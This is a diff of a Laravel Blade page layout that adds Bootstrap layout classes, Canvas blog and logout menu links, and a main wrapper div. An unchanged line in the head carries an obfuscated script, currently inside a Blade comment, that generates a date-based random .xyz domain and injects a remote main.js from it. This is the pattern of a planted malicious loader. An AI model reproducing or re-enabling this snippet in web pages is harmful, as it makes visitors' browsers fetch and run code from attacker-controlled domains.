@@ -28,7 +28,7 @@ if (isset($post) && isset($post['meta'])) {
 }
 @endphp
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="h-100">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
@@ -45,7 +45,7 @@ if (isset($post) && isset($post['meta'])) {
   {{-- <script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"xc449bad4854773ff")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);</script> --}}
 </head>
 
-<body id="page-top">
+<body id="page-top" class="d-flex flex-column h-100">
   <div id="fb-root"></div>
   <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v9.0&appId=695473097788503&autoLogAppEvents=1" nonce="{{ Str::random(8) }}"></script>
 
@@ -96,19 +96,32 @@ if (isset($post) && isset($post['meta'])) {
             </a>
             {{-- <a class="dropdown-item" href="#">Something else here</a> --}}
             @endifwinkauthenticated
+            @ifcanvasauthenticated
+            <div class="dropdown-divider"></div>
+            <a class="dropdown-item" href="/{{ config('canvas.path') }}">
+              Canvas Blog
+            </a>
+            {{-- <a class="dropdown-item" href="#">Something else here</a> --}}
+            @endifcanvasauthenticated
+            @ifauthenticated
+            <div class="dropdown-divider"></div>
+            <a class="dropdown-item" href="/logout">
+              Log out
+            </a>
+            @endifauthenticated
           </div>
         </li>
       </ul>
     </div><!-- /.navbar-collapse -->
   </nav>
 
-  <div class="container-fluid mx-0 my-1 p-0">
-
+  <div id="main">
+    <div class="container-fluid mx-0 my-1 p-0">
   @yield('main')
-
+    </div>
   </div>
 
-  <footer class="footer bg-secondary py-3 text-white position-sticky fixed-bottom">
+  <footer class="footer bg-secondary mt-auto py-3 text-white position-sticky fixed-bottom">
     <div class="container-fluid">
       <div class="row">
         <div class="col-sm text-right">
